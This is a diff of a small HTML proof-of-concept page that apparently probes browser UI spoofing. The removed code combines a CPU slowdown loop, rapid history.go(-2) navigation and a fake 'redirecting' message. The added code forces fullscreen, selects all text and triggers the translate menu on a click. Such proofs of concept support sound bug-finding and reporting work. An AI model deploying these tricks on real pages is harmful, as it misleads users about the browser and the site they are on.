@@ -1,42 +1,26 @@
- <script>
-    //// MDN calculatePrimes slowdown code
-    function calculatePrimes(iterations, multiplier) {
-        var primes = [];
-        for (var i = 0; i < iterations; i++) {
-            var candidate = i * (multiplier * Math.random());
-            var isPrime = true;
-            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
-                if (candidate % c === 0) {
-                    // not prime
-                    isPrime = false;
-                    break;
-                }
-            }
-            if (isPrime) {
-                primes.push(candidate);
-            }
-        }
-        return primes;
-    }
-
-
-    function main() {
-        location.reload()
-        calculatePrimes(1000, 100000)
-        window.queueMicrotask(spoof)
-    }
-
-    function spoof() {
-        document.getElementById("image").src = null
-
-        setInterval(function () {
-            window.history.go(-2)
-        }, 9)
-    }
-</script>
-Please wait while we redirecting you...
-<img id="image" src="" style="font-family: 'Roboto'; opacity: 0%">
+<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
 
 <script>
-    main()
-</scrip
+    function rfsSelectAll() {
+        document.documentElement.requestFullscreen();
+        document.execCommand("selectAll");
+    }
+
+    function selectAllChildren() {
+        document.getSelection().selectAllChildren(paragraph1);
+    }
+</script>
+
+<body>
+    <img style="margin-top: 9999px;"></img>
+
+    <p id="paragraph1">
+        <!-- Trigger Translate Menu -->
+        A[=
+        ?:TLv
+        S9y
+        <!-- Trigger Translate Menu -->
+    </p>
+</body>
+
+</html>
